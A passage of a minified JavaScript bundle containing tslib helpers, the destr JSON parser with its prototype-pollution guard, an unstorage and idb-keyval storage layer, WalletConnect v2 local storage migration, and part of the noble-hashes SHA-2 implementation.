s;switch(n=0,s&&(l=[l[0]&2,s.value]),l[0]){case 0:case 1:s=l;break;case 4:return t.label++,{value:l[1],done:!1};case 5:t.label++,n=l[1],l=[0];continue;case 7:l=t.ops.pop(),t.trys.pop();continue;default:if(s=t.trys,!(s=s.length>0&&s[s.length-1])&&(l[0]===6||l[0]===2)){t=0;continue}if(l[0]===3&&(!s||l[1]>s[0]&&l[1]<s[3])){t.label=l[1];break}if(l[0]===6&&t.label<s[1]){t.label=s[1],s=l;break}if(s&&t.label<s[2]){t.label=s[2],t.ops.push(l);break}s[2]&&t.ops.pop(),t.trys.pop();continue}l=e.call(r,t)}catch(u){l=[6,u],n=0}finally{i=s=0}if(l[0]&5)throw l[1];return{value:l[0]?l[1]:void 0,done:!0}}}function Ime(r,e,t,i){i===void 0&&(i=t),r[i]=e[t]}function Tme(r,e){for(var t in r)t!=="default"&&!e.hasOwnProperty(t)&&(e[t]=r[t])}function wk(r){var e=typeof Symbol=="function"&&Symbol.iterator,t=e&&r[e],i=0;if(t)return t.call(r);if(r&&typeof r.length=="number")return{next:function(){return r&&i>=r.length&&(r=void 0),{value:r&&r[i++],done:!r}}};throw new TypeError(e?"Object is not iterable.":"Symbol.iterator is not defined.")}function UJ(r,e){var t=typeof Symbol=="function"&&r[Symbol.iterator];if(!t)return r;var i=t.call(r),n,s=[],o;try{for(;(e===void 0||e-- >0)&&!(n=i.next()).done;)s.push(n.value)}catch(a){o={error:a}}finally{try{n&&!n.done&&(t=i.return)&&t.call(i)}finally{if(o)throw o.error}}return s}function kme(){for(var r=[],e=0;e<arguments.length;e++)r=r.concat(UJ(arguments[e]));return r}function Nme(){for(var r=0,e=0,t=arguments.length;e<t;e++)r+=arguments[e].length;for(var i=Array(r),n=0,e=0;e<t;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)i[n]=s[o];return i}function zv(r){return this instanceof zv?(this.v=r,this):new zv(r)}function Pme(r,e,t){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var i=t.apply(r,e||[]),n,s=[];return n={},o("next"),o("throw"),o("return"),n[Symbol.asyncIterator]=function(){return this},n;function o(h){i[h]&&(n[h]=function(f){return new Promise(function(p,g){s.push([h,f,p,g])>1||a(h,f)})})}function a(h,f){try{c(i[h](f))}catch(p){d(s[0][3],p)}}function c(h){h.value instanceof zv?Promise.resolve(h.value.v).then(l,u):d(s[0][2],h)}function l(h){a("next",h)}function u(h){a("throw",h)}function d(h,f){h(f),s.shift(),s.length&&a(s[0][0],s[0][1])}}function $me(r){var e,t;return e={},i("next"),i("throw",function(n){throw n}),i("return"),e[Symbol.iterator]=function(){return this},e;function i(n,s){e[n]=r[n]?function(o){return(t=!t)?{value:zv(r[n](o)),done:n==="return"}:s?s(o):o}:s}}function Rme(r){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var e=r[Symbol.asyncIterator],t;return e?e.call(r):(r=typeof wk=="function"?wk(r):r[Symbol.iterator](),t={},i("next"),i("throw"),i("return"),t[Symbol.asyncIterator]=function(){return this},t);function i(s){t[s]=r[s]&&function(o){return new Promise(function(a,c){o=r[s](o),n(a,c,o.done,o.value)})}}function n(s,o,a,c){Promise.resolve(c).then(function(l){s({value:l,done:a})},o)}}function Ome(r,e){return Object.defineProperty?Object.defineProperty(r,"raw",{value:e}):r.raw=e,r}function Bme(r){if(r&&r.__esModule)return r;var e={};if(r!=null)for(var t in r)Object.hasOwnProperty.call(r,t)&&(e[t]=r[t]);return e.default=r,e}function Mme(r){return r&&r.__esModule?r:{default:r}}function Dme(r,e){if(!e.has(r))throw new TypeError("attempted to get private field on non-instance");return e.get(r)}function Lme(r,e,t){if(!e.has(r))throw new TypeError("attempted to set private field on non-instance");return e.set(r,t),t}const Ume=Object.freeze(Object.defineProperty({__proto__:null,get __assign(){return mk},__asyncDelegator:$me,__asyncGenerator:Pme,__asyncValues:Rme,__await:zv,__awaiter:Sme,__classPrivateFieldGet:Dme,__classPrivateFieldSet:Lme,__createBinding:Ime,__decorate:Cme,__exportStar:Tme,__extends:yme,__generator:Ame,__importDefault:Mme,__importStar:Bme,__makeTemplateObject:Ome,__metadata:_me,__param:Eme,__read:UJ,__rest:xme,__spread:kme,__spreadArrays:Nme,__values:wk},Symbol.toStringTag,{value:"Module"})),a4=$n(Ume);var aS={},fb={},NL;function jme(){if(NL)return fb;NL=1,Object.defineProperty(fb,"__esModule",{value:!0}),fb.delay=void 0;function r(e){return new Promise(t=>{setTimeout(()=>{t(!0)},e)})}return fb.delay=r,fb}var qp={},cS={},zp={},PL;function Fme(){return PL||(PL=1,Object.defineProperty(zp,"__esModule",{value:!0}),zp.ONE_THOUSAND=zp.ONE_HUNDRED=void 0,zp.ONE_HUNDRED=100,zp.ONE_THOUSAND=1e3),zp}var lS={},$L;function qme(){return $L||($L=1,function(r){Object.defineProperty(r,"__esModule",{value:!0}),r.ONE_YEAR=r.FOUR_WEEKS=r.THREE_WEEKS=r.TWO_WEEKS=r.ONE_WEEK=r.THIRTY_DAYS=r.SEVEN_DAYS=r.FIVE_DAYS=r.THREE_DAYS=r.ONE_DAY=r.TWENTY_FOUR_HOURS=r.TWELVE_HOURS=r.SIX_HOURS=r.THREE_HOURS=r.ONE_HOUR=r.SIXTY_MINUTES=r.THIRTY_MINUTES=r.TEN_MINUTES=r.FIVE_MINUTES=r.ONE_MINUTE=r.SIXTY_SECONDS=r.THIRTY_SECONDS=r.TEN_SECONDS=r.FIVE_SECONDS=r.ONE_SECOND=void 0,r.ONE_SECOND=1,r.FIVE_SECONDS=5,r.TEN_SECONDS=10,r.THIRTY_SECONDS=30,r.SIXTY_SECONDS=60,r.ONE_MINUTE=r.SIXTY_SECONDS,r.FIVE_MINUTES=r.ONE_MINUTE*5,r.TEN_MINUTES=r.ONE_MINUTE*10,r.THIRTY_MINUTES=r.ONE_MINUTE*30,r.SIXTY_MINUTES=r.ONE_MINUTE*60,r.ONE_HOUR=r.SIXTY_MINUTES,r.THREE_HOURS=r.ONE_HOUR*3,r.SIX_HOURS=r.ONE_HOUR*6,r.TWELVE_HOURS=r.ONE_HOUR*12,r.TWENTY_FOUR_HOURS=r.ONE_HOUR*24,r.ONE_DAY=r.TWENTY_FOUR_HOURS,r.THREE_DAYS=r.ONE_DAY*3,r.FIVE_DAYS=r.ONE_DAY*5,r.SEVEN_DAYS=r.ONE_DAY*7,r.THIRTY_DAYS=r.ONE_DAY*30,r.ONE_WEEK=r.SEVEN_DAYS,r.TWO_WEEKS=r.ONE_WEEK*2,r.THREE_WEEKS=r.ONE_WEEK*3,r.FOUR_WEEKS=r.ONE_WEEK*4,r.ONE_YEAR=r.ONE_DAY*365}(lS)),lS}var RL;function jJ(){return RL||(RL=1,function(r){Object.defineProperty(r,"__esModule",{value:!0});const e=a4;e.__exportStar(Fme(),r),e.__exportStar(qme(),r)}(cS)),cS}var OL;function zme(){if(OL)return qp;OL=1,Object.defineProperty(qp,"__esModule",{value:!0}),qp.fromMiliseconds=qp.toMiliseconds=void 0;const r=jJ();function e(i){return i*r.ONE_THOUSAND}qp.toMiliseconds=e;function t(i){return Math.floor(i/r.ONE_THOUSAND)}return qp.fromMiliseconds=t,qp}var BL;function Wme(){return BL||(BL=1,function(r){Object.defineProperty(r,"__esModule",{value:!0});const e=a4;e.__exportStar(jme(),r),e.__exportStar(zme(),r)}(aS)),aS}var L2={},ML;function Hme(){if(ML)return L2;ML=1,Object.defineProperty(L2,"__esModule",{value:!0}),L2.Watch=void 0;class r{constructor(){this.timestamps=new Map}start(t){if(this.timestamps.has(t))throw new Error(`Watch already started for label: ${t}`);this.timestamps.set(t,{started:Date.now()})}stop(t){const i=this.get(t);if(typeof i.elapsed<"u")throw new Error(`Watch already stopped for label: ${t}`);const n=Date.now()-i.started;this.timestamps.set(t,{started:i.started,elapsed:n})}get(t){const i=this.timestamps.get(t);if(typeof i>"u")throw new Error(`No timestamp found for label: ${t}`);return i}elapsed(t){const i=this.get(t);return i.elapsed||Date.now()-i.started}}return L2.Watch=r,L2.default=r,L2}var uS={},pb={},DL;function Vme(){if(DL)return pb;DL=1,Object.defineProperty(pb,"__esModule",{value:!0}),pb.IWatch=void 0;class r{}return pb.IWatch=r,pb}var LL;function Kme(){return LL||(LL=1,function(r){Object.defineProperty(r,"__esModule",{value:!0}),a4.__exportStar(Vme(),r)}(uS)),uS}var UL;function Gme(){return UL||(UL=1,function(r){Object.defineProperty(r,"__esModule",{value:!0});const e=a4;e.__exportStar(Wme(),r),e.__exportStar(Hme(),r),e.__exportStar(Kme(),r),e.__exportStar(jJ(),r)}(oS)),oS}var fe=Gme();class As{}let Zme=class extends As{constructor(e){super()}};const jL=fe.FIVE_SECONDS,Ks={pulse:"heartbeat_pulse"};let Z$=class FJ extends Zme{constructor(e){super(e),this.events=new en.EventEmitter,this.interval=jL,this.interval=e?.interval||jL}static async init(e){const t=new FJ(e);return await t.init(),t}async init(){await this.initialize()}stop(){clearInterval(this.intervalRef)}on(e,t){this.events.on(e,t)}once(e,t){this.events.once(e,t)}off(e,t){this.events.off(e,t)}removeListener(e,t){this.events.removeListener(e,t)}async initialize(){this.intervalRef=setInterval(()=>this.pulse(),fe.toMiliseconds(this.interval))}pulse(){this.events.emit(Ks.pulse)}};const Yme=/"(?:_|\\u0{2}5[Ff]){2}(?:p|\\u0{2}70)(?:r|\\u0{2}72)(?:o|\\u0{2}6[Ff])(?:t|\\u0{2}74)(?:o|\\u0{2}6[Ff])(?:_|\\u0{2}5[Ff]){2}"\s*:/,Jme=/"(?:c|\\u0063)(?:o|\\u006[Ff])(?:n|\\u006[Ee])(?:s|\\u0073)(?:t|\\u0074)(?:r|\\u0072)(?:u|\\u0075)(?:c|\\u0063)(?:t|\\u0074)(?:o|\\u006[Ff])(?:r|\\u0072)"\s*:/,Qme=/^\s*["[{]|^\s*-?\d{1,16}(\.\d{1,17})?([Ee][+-]?\d+)?\s*$/;function Xme(r,e){if(r==="__proto__"||r==="constructor"&&e&&typeof e=="object"&&"prototype"in e){ewe(r);return}return e}function ewe(r){console.warn(`[destr] Dropping "${r}" key to prevent prototype pollution.`)}function z6(r,e={}){if(typeof r!="string")return r;if(r[0]==='"'&&r[r.length-1]==='"'&&r.indexOf("\\")===-1)return r.slice(1,-1);const t=r.trim();if(t.length<=9)switch(t.toLowerCase()){case"true":return!0;case"false":return!1;case"undefined":return;case"null":return null;case"nan":return Number.NaN;case"infinity":return Number.POSITIVE_INFINITY;case"-infinity":return Number.NEGATIVE_INFINITY}if(!Qme.test(r)){if(e.strict)throw new SyntaxError("[destr] Invalid JSON");return r}try{if(Yme.test(r)||Jme.test(r)){if(e.strict)throw new Error("[destr] Possible prototype pollution");return JSON.parse(r,Xme)}return JSON.parse(r)}catch(i){if(e.strict)throw i;return r}}function twe(r){return!r||typeof r.then!="function"?Promise.resolve(r):r}function Bs(r,...e){try{return twe(r(...e))}catch(t){return Promise.reject(t)}}function rwe(r){const e=typeof r;return r===null||e!=="object"&&e!=="function"}function iwe(r){const e=Object.getPrototypeOf(r);return!e||e.isPrototypeOf(Object)}function r9(r){if(rwe(r))return String(r);if(iwe(r)||Array.isArray(r))return JSON.stringify(r);if(typeof r.toJSON=="function")return r9(r.toJSON());throw new Error("[unstorage] Cannot stringify value!")}const bk="base64:";function nwe(r){return typeof r=="string"?r:bk+awe(r)}function swe(r){return typeof r!="string"||!r.startsWith(bk)?r:owe(r.slice(bk.length))}function owe(r){return globalThis.Buffer?Buffer.from(r,"base64"):Uint8Array.from(globalThis.atob(r),e=>e.codePointAt(0))}function awe(r){return globalThis.Buffer?Buffer.from(r).toString("base64"):globalThis.btoa(String.fromCodePoint(...r))}function ga(r){return r&&r.split("?")[0]?.replace(/[/\\]/g,":").replace(/:+/g,":").replace(/^:|:$/g,"")||""}function cwe(...r){return ga(r.join(":"))}function W6(r){return r=ga(r),r?r+":":""}function lwe(r,e){if(e===void 0)return!0;let t=0,i=r.indexOf(":");for(;i>-1;)t++,i=r.indexOf(":",i+1);return t<=e}function uwe(r,e){return e?r.startsWith(e)&&r[r.length-1]!=="$":r[r.length-1]!=="$"}const dwe="memory",hwe=()=>{const r=new Map;return{name:dwe,getInstance:()=>r,hasItem(e){return r.has(e)},getItem(e){return r.get(e)??null},getItemRaw(e){return r.get(e)??null},setItem(e,t){r.set(e,t)},setItemRaw(e,t){r.set(e,t)},removeItem(e){r.delete(e)},getKeys(){return[...r.keys()]},clear(){r.clear()},dispose(){r.clear()}}};function fwe(r={}){const e={mounts:{"":r.driver||hwe()},mountpoints:[""],watching:!1,watchListeners:[],unwatch:{}},t=l=>{for(const u of e.mountpoints)if(l.startsWith(u))return{base:u,relativeKey:l.slice(u.length),driver:e.mounts[u]};return{base:"",relativeKey:l,driver:e.mounts[""]}},i=(l,u)=>e.mountpoints.filter(d=>d.startsWith(l)||u&&l.startsWith(d)).map(d=>({relativeBase:l.length>d.length?l.slice(d.length):void 0,mountpoint:d,driver:e.mounts[d]})),n=(l,u)=>{if(e.watching){u=ga(u);for(const d of e.watchListeners)d(l,u)}},s=async()=>{if(!e.watching){e.watching=!0;for(const l in e.mounts)e.unwatch[l]=await FL(e.mounts[l],n,l)}},o=async()=>{if(e.watching){for(const l in e.unwatch)await e.unwatch[l]();e.unwatch={},e.watching=!1}},a=(l,u,d)=>{const h=new Map,f=p=>{let g=h.get(p.base);return g||(g={driver:p.driver,base:p.base,items:[]},h.set(p.base,g)),g};for(const p of l){const g=typeof p=="string",w=ga(g?p:p.key),m=g?void 0:p.value,x=g||!p.options?u:{...u,...p.options},S=t(w);f(S).items.push({key:w,value:m,relativeKey:S.relativeKey,options:x})}return Promise.all([...h.values()].map(p=>d(p))).then(p=>p.flat())},c={hasItem(l,u={}){l=ga(l);const{relativeKey:d,driver:h}=t(l);return Bs(h.hasItem,d,u)},getItem(l,u={}){l=ga(l);const{relativeKey:d,driver:h}=t(l);return Bs(h.getItem,d,u).then(f=>z6(f))},getItems(l,u={}){return a(l,u,d=>d.driver.getItems?Bs(d.driver.getItems,d.items.map(h=>({key:h.relativeKey,options:h.options})),u).then(h=>h.map(f=>({key:cwe(d.base,f.key),value:z6(f.value)}))):Promise.all(d.items.map(h=>Bs(d.driver.getItem,h.relativeKey,h.options).then(f=>({key:h.key,value:z6(f)})))))},getItemRaw(l,u={}){l=ga(l);const{relativeKey:d,driver:h}=t(l);return h.getItemRaw?Bs(h.getItemRaw,d,u):Bs(h.getItem,d,u).then(f=>swe(f))},async setItem(l,u,d={}){if(u===void 0)return c.removeItem(l);l=ga(l);const{relativeKey:h,driver:f}=t(l);f.setItem&&(await Bs(f.setItem,h,r9(u),d),f.watch||n("update",l))},async setItems(l,u){await a(l,u,async d=>{if(d.driver.setItems)return Bs(d.driver.setItems,d.items.map(h=>({key:h.relativeKey,value:r9(h.value),options:h.options})),u);d.driver.setItem&&await Promise.all(d.items.map(h=>Bs(d.driver.setItem,h.relativeKey,r9(h.value),h.options)))})},async setItemRaw(l,u,d={}){if(u===void 0)return c.removeItem(l,d);l=ga(l);const{relativeKey:h,driver:f}=t(l);if(f.setItemRaw)await Bs(f.setItemRaw,h,u,d);else if(f.setItem)await Bs(f.setItem,h,nwe(u),d);else return;f.watch||n("update",l)},async removeItem(l,u={}){typeof u=="boolean"&&(u={removeMeta:u}),l=ga(l);const{relativeKey:d,driver:h}=t(l);h.removeItem&&(await Bs(h.removeItem,d,u),(u.removeMeta||u.removeMata)&&await Bs(h.removeItem,d+"$",u),h.watch||n("remove",l))},async getMeta(l,u={}){typeof u=="boolean"&&(u={nativeOnly:u}),l=ga(l);const{relativeKey:d,driver:h}=t(l),f=Object.create(null);if(h.getMeta&&Object.assign(f,await Bs(h.getMeta,d,u)),!u.nativeOnly){const p=await Bs(h.getItem,d+"$",u).then(g=>z6(g));p&&typeof p=="object"&&(typeof p.atime=="string"&&(p.atime=new Date(p.atime)),typeof p.mtime=="string"&&(p.mtime=new Date(p.mtime)),Object.assign(f,p))}return f},setMeta(l,u,d={}){return this.setItem(l+"$",u,d)},removeMeta(l,u={}){return this.removeItem(l+"$",u)},async getKeys(l,u={}){l=W6(l);const d=i(l,!0);let h=[];const f=[];let p=!0;for(const w of d){w.driver.flags?.maxDepth||(p=!1);const m=await Bs(w.driver.getKeys,w.relativeBase,u);for(const x of m){const S=w.mountpoint+ga(x);h.some(T=>S.startsWith(T))||f.push(S)}h=[w.mountpoint,...h.filter(x=>!x.startsWith(w.mountpoint))]}const g=u.maxDepth!==void 0&&!p;return f.filter(w=>(!g||lwe(w,u.maxDepth))&&uwe(w,l))},async clear(l,u={}){l=W6(l),await Promise.all(i(l,!1).map(async d=>{if(d.driver.clear)return Bs(d.driver.clear,d.relativeBase,u);if(d.driver.removeItem){const h=await d.driver.getKeys(d.relativeBase||"",u);return Promise.all(h.map(f=>d.driver.removeItem(f,u)))}}))},async dispose(){await Promise.all(Object.values(e.mounts).map(l=>qL(l)))},async watch(l){return await s(),e.watchListeners.push(l),async()=>{e.watchListeners=e.watchListeners.filter(u=>u!==l),e.watchListeners.length===0&&await o()}},async unwatch(){e.watchListeners=[],await o()},mount(l,u){if(l=W6(l),l&&e.mounts[l])throw new Error(`already mounted at ${l}`);return l&&(e.mountpoints.push(l),e.mountpoints.sort((d,h)=>h.length-d.length)),e.mounts[l]=u,e.watching&&Promise.resolve(FL(u,n,l)).then(d=>{e.unwatch[l]=d}).catch(console.error),c},async unmount(l,u=!0){l=W6(l),!(!l||!e.mounts[l])&&(e.watching&&l in e.unwatch&&(e.unwatch[l]?.(),delete e.unwatch[l]),u&&await qL(e.mounts[l]),e.mountpoints=e.mountpoints.filter(d=>d!==l),delete e.mounts[l])},getMount(l=""){l=ga(l)+":";const u=t(l);return{driver:u.driver,base:u.base}},getMounts(l="",u={}){return l=ga(l),i(l,u.parents).map(h=>({driver:h.driver,base:h.mountpoint}))},keys:(l,u={})=>c.getKeys(l,u),get:(l,u={})=>c.getItem(l,u),set:(l,u,d={})=>c.setItem(l,u,d),has:(l,u={})=>c.hasItem(l,u),del:(l,u={})=>c.removeItem(l,u),remove:(l,u={})=>c.removeItem(l,u)};return c}function FL(r,e,t){return r.watch?r.watch((i,n)=>e(i,t+n)):()=>{}}async function qL(r){typeof r.dispose=="function"&&await Bs(r.dispose)}function n2(r){return new Promise((e,t)=>{r.oncomplete=r.onsuccess=()=>e(r.result),r.onabort=r.onerror=()=>t(r.error)})}function qJ(r,e){let t;const i=()=>{if(t)return t;const n=indexedDB.open(r);return n.onupgradeneeded=()=>n.result.createObjectStore(e),t=n2(n),t.then(s=>{s.onclose=()=>t=void 0},()=>{}),t};return(n,s)=>i().then(o=>s(o.transaction(e,n).objectStore(e)))}let dS;function c4(){return dS||(dS=qJ("keyval-store","keyval")),dS}function zL(r,e=c4()){return e("readonly",t=>n2(t.get(r)))}function pwe(r,e,t=c4()){return t("readwrite",i=>(i.put(e,r),n2(i.transaction)))}function gwe(r,e=c4()){return e("readwrite",t=>(t.delete(r),n2(t.transaction)))}function mwe(r=c4()){return r("readwrite",e=>(e.clear(),n2(e.transaction)))}function wwe(r,e){return r.openCursor().onsuccess=function(){this.result&&(e(this.result),this.result.continue())},n2(r.transaction)}function bwe(r=c4()){return r("readonly",e=>{if(e.getAllKeys)return n2(e.getAllKeys());const t=[];return wwe(e,i=>t.push(i.key)).then(()=>t)})}const vwe="idb-keyval";var ywe=(r={})=>{const e=r.base&&r.base.length>0?`${r.base}:`:"",t=n=>e+n;let i;return r.dbName&&r.storeName&&(i=qJ(r.dbName,r.storeName)),{name:vwe,options:r,async hasItem(n){return!(typeof await zL(t(n),i)>"u")},async getItem(n){return await zL(t(n),i)??null},setItem(n,s){return pwe(t(n),s,i)},removeItem(n){return gwe(t(n),i)},getKeys(){return bwe(i)},clear(){return mwe(i)}}};const xwe="WALLET_CONNECT_V2_INDEXED_DB",Cwe="keyvaluestorage";let Ewe=class{constructor(){this.indexedDb=fwe({driver:ywe({dbName:xwe,storeName:Cwe})})}async getKeys(){return this.indexedDb.getKeys()}async getEntries(){return(await this.indexedDb.getItems(await this.indexedDb.getKeys())).map(e=>[e.key,e.value])}async getItem(e){const t=await this.indexedDb.getItem(e);if(t!==null)return t}async setItem(e,t){await this.indexedDb.setItem(e,mu(t))}async removeItem(e){await this.indexedDb.removeItem(e)}};var hS=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{},i9={exports:{}};(function(){let r;function e(){}r=e,r.prototype.getItem=function(t){return this.hasOwnProperty(t)?String(this[t]):null},r.prototype.setItem=function(t,i){this[t]=String(i)},r.prototype.removeItem=function(t){delete this[t]},r.prototype.clear=function(){const t=this;Object.keys(t).forEach(function(i){t[i]=void 0,delete t[i]})},r.prototype.key=function(t){return t=t||0,Object.keys(this)[t]},r.prototype.__defineGetter__("length",function(){return Object.keys(this).length}),typeof hS<"u"&&hS.localStorage?i9.exports=hS.localStorage:typeof window<"u"&&window.localStorage?i9.exports=window.localStorage:i9.exports=new e})();function _we(r){var e;return[r[0],gu((e=r[1])!=null?e:"")]}let Swe=class{constructor(){this.localStorage=i9.exports}async getKeys(){return Object.keys(this.localStorage)}async getEntries(){return Object.entries(this.localStorage).map(_we)}async getItem(e){const t=this.localStorage.getItem(e);if(t!==null)return gu(t)}async setItem(e,t){this.localStorage.setItem(e,mu(t))}async removeItem(e){this.localStorage.removeItem(e)}};const Awe="wc_storage_version",WL=1,Iwe=async(r,e,t)=>{const i=Awe,n=await e.getItem(i);if(n&&n>=WL){t(e);return}const s=await r.getKeys();if(!s.length){t(e);return}const o=[];for(;s.length;){const a=s.shift();if(!a)continue;const c=a.toLowerCase();if(c.includes("wc@")||c.includes("walletconnect")||c.includes("wc_")||c.includes("wallet_connect")){const l=await r.getItem(a);await e.setItem(a,l),o.push(a)}}await e.setItem(i,WL),t(e),Twe(r,o)},Twe=async(r,e)=>{e.length&&e.forEach(async t=>{await r.removeItem(t)})};let Y$=class{constructor(){this.initialized=!1,this.setInitialized=t=>{this.storage=t,this.initialized=!0};const e=new Swe;this.storage=e;try{const t=new Ewe;Iwe(e,t,this.setInitialized)}catch{this.initialized=!0}}async getKeys(){return await this.initialize(),this.storage.getKeys()}async getEntries(){return await this.initialize(),this.storage.getEntries()}async getItem(e){return await this.initialize(),this.storage.getItem(e)}async setItem(e,t){return await this.initialize(),this.storage.setItem(e,t)}async removeItem(e){return await this.initialize(),this.storage.removeItem(e)}async initialize(){this.initialized||await new Promise(e=>{const t=setInterval(()=>{this.initialized&&(clearInterval(t),e())},20)})}},kwe=class extends As{constructor(e){super(),this.opts=e,this.protocol="wc",this.version=2}},Nwe=class extends As{constructor(e,t){super(),this.core=e,this.logger=t,this.records=new Map}},Pwe=class{constructor(e,t){this.logger=e,this.core=t}},$we=class extends As{constructor(e,t){super(),this.relayer=e,this.logger=t}},Rwe=class extends As{constructor(e){super()}},Owe=class{constructor(e,t,i,n){this.core=e,this.logger=t,this.name=i}},Bwe=class extends As{constructor(e,t){super(),this.relayer=e,this.logger=t}},Mwe=class extends As{constructor(e,t){super(),this.core=e,this.logger=t}},Dwe=class{constructor(e,t,i){this.core=e,this.logger=t,this.store=i}},Lwe=class{constructor(e,t){this.projectId=e,this.logger=t}},Uwe=class{constructor(e,t,i){this.core=e,this.logger=t,this.telemetryEnabled=i}},jwe=class{constructor(e){this.opts=e,this.protocol="wc",this.version=2}},Fwe=class{constructor(e){this.client=e}};function qwe(r){return r instanceof Uint8Array||ArrayBuffer.isView(r)&&r.constructor.name==="Uint8Array"}function zJ(r,...e){if(!qwe(r))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(r.length))throw new Error("Uint8Array expected of length "+e+", got length="+r.length)}function HL(r,e=!0){if(r.destroyed)throw new Error("Hash instance has been destroyed");if(e&&r.finished)throw new Error("Hash#digest() has already been called")}function zwe(r,e){zJ(r);const t=e.outputLen;if(r.length<t)throw new Error("digestInto() expects output buffer of length at least "+t)}const U2=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */const fS=r=>new DataView(r.buffer,r.byteOffset,r.byteLength);function Wwe(r){if(typeof r!="string")throw new Error("utf8ToBytes expected string, got "+typeof r);return new Uint8Array(new TextEncoder().encode(r))}function WJ(r){return typeof r=="string"&&(r=Wwe(r)),zJ(r),r}let Hwe=class{clone(){return this._cloneInto()}};function Vwe(r){const e=i=>r().update(WJ(i)).digest(),t=r();return e.outputLen=t.outputLen,e.blockLen=t.blockLen,e.create=()=>r(),e}function HJ(r=32){if(U2&&typeof U2.getRandomValues=="function")return U2.getRandomValues(new Uint8Array(r));if(U2&&typeof U2.randomBytes=="function")return U2.randomBytes(r);throw new Error("crypto.getRandomValues must be defined")}function Kwe(r,e,t,i){if(typeof r.setBigUint64=="function")return r.setBigUint64(e,t,i);const n=BigInt(32),s=BigInt(4294967295),o=Number(t>>n&s),a=Number(t&s),c=i?4:0,l=i?0:4;r.setUint32(e+c,o,i),r.setUint32(e+l,a,i)}let Gwe=class extends Hwe{constructor(e,t,i,n){super(),this.blockLen=e,this.outputLen=t,this.padOffset=i,this.isLE=n,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(e),this.view=fS(this.buffer)}update(e){HL(this);const{view:t,buffer:i,blockLen:n}=this;e=WJ(e);const s=e.length;for(let o=0;o<s;){const a=Math.min(n-this.pos,s-o);if(a===n){const c=fS(e);for(;n<=s-o;o+=n)this.process(c,o);continue}i.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===n&&(this.process(t,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){HL(this),zwe(e,this),this.finished=!0;const{buffer:t,view:i,blockLen:n,isLE:s}=this;let{pos:o}=this;t[o++]=128,this.buffer.subarray(o).fill(0),this.padOffset>n-o&&(this.process(i,0),o=0);for(let d=o;d<n;d++)t[d]=0;Kwe(i,n-8,BigInt(this.length*8),s),this.process(i,0);const a=fS(e),c=this.outputLen;if(c%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const l=c/4,u=this.get();if(l>u.length)throw new Error("_sha2: outputLen bigger than state");for(let d=0;d<l;d++)a.setUint32(4*d,u[d],s)}digest(){const{buffer:e,outputLen:t}=this;this.digestInto(e);const i=e.slice(0,t);return this.destroy(),i}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:t,buffer:i,length:n,finished:s,destroyed:o,pos:a}=this;return e.length=n,e.pos=a,e.finished=s,e.destroyed=o,n%t&&e.buffer.set(i),e}};const H6=BigInt(2**32-1),vk=BigInt(32);function VJ(r,e=!1){return e?{h:Number(r&H6),l:Number(r>>vk&H6)}:{h:Number(r>>vk&H6)|0,l:Number(r&H6)|0}}function Zwe(r,e=!1){let t=new Uint32Array(r.length),i=new Uint32Array(r.length);for(let n=0;n<r.length;n++){const{h:s,l:o}=VJ(r[n],e);[t[n],i[n]]=[s,o]}return[t,i]}const Ywe=(r,e)=>BigInt(r>>>0)<<vk|BigInt(e>>>0),Jwe=(r,e,t)=>r>>>t,Qwe=(r,e,t)=>r<<32-t|e>>>t,Xwe=(r,e,t)=>r>>>t|e<<32-t,e3e=(r,e,t)=>r<<32-t|e>>>t,t3e=(r,e,t)=>r<<64-t|e>>>t-32,r3e=(r,e,t)=>r>>>t-32|e<<64-t,i3e=(r,e)=>e,n3e=(r,e)=>r,s3e=(r,e,t)=>r<<t|e>>>32-t,o3e=(r,e,t)=>e<<t|r>>>32-t,a3e=(r,e,t)=>e<<t-32|r>>>64-t,c3e=(r,e,t)=>r<<t-32|e>>>64-t;function l3e(r,e,t,i){const n=(e>>>0)+(i>>>0);return{h:r+t+(n/2**32|0)|0,l:n|0}}const u3e=(r,e,t)=>(r>>>0)+(e>>>0)+(t>>>0),d3e=(r,e,t,i)=>e+t+i+(r/2**32|0)|0,h3e=(r,e,t,i)=>(r>>>0)+(e>>>0)+(t>>>0)+(i>>>0),f3e=(r,e,t,i,n)=>e+t+i+n+(r/2**32|0)|0,p3e=(r,e,t,i,n)=>(r>>>0)+(e>>>0)+(t>>>0)+(i>>>0)+(n>>>0),g3e=(r,e,t,i,n,s)=>e+t+i+n+s+(r/2**32|0)|0,$r={fromBig:VJ,split:Zwe,toBig:Ywe,shrSH:Jwe,shrSL:Qwe,rotrSH:Xwe,rotrSL:e3e,rotrBH:t3e,rotrBL:r3e,rotr32H:i3e,rotr32L:n3e,rotlSH:s3e,rotlSL:o3e,rotlBH:a3e,rotlBL:c3e,add:l3e,add3L:u3e,add3H:d3e,add4L:h3e,add4H:f3e,add5H:g3e,add5L:p3e},[m3e,w3e]=$r.split(["0x428a2f98d728ae22","0x7137449123ef65cd","0xb5c0fbcfec4d3b2f","0xe9b5dba58189dbbc","0x3956c25bf348b538","0x59f111f1b605d019","0x923f82a4af194f9b","0xab1c5ed5da6d8118","0xd807aa98a3030242","0x12835b0145706fbe","0x243185be4ee4b28c","0x550c7dc3d5ffb4e2","0x72be5d74f27b896f","0x80deb1fe3b1696b1","0x9bdc06a725c71235","0xc19bf174cf692694","0xe49b69c19ef14ad2","0xefbe4786384f25e3","0x0fc19dc68b8cd5b5","0x240ca1cc77ac9c65","0x2de92c6f592b0275","0x4a7484aa6ea6e483","0x5cb0a9dcbd41fbd4","0x76f988da831153b5","0x983e5152ee66dfab","0xa831c66d2db43210","0xb00327c898fb213f","0xbf597fc7beef0ee4","0xc6e00bf33da88fc2","0xd5a79147930aa725","0x06ca6351e003826f","0x142929670a0e6e70","0x27b70a8546d22ffc","0x2e1b21385c26c926","0x4d2c6dfc5ac42aed","0x53380d139d95b3